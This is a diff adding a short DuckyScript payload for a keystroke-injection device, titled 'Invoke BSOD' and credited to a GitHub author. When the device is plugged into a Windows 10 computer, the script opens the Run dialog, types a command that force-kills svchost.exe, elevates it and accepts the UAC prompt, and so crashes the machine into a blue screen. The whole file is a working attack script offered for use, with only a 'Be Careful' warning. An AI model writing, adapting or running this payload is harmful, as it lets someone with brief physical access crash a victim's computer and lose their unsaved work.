@@ -1,0 +1,17 @@
+REM Title: Invoke BSOD
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: This will open powershell and cause a blue screen.
+REM Target: Windows 10
+
+REM ***This is a dangerous script - Be Careful!!!***
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING cmd /c taskkill /f /im svchost.exe
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
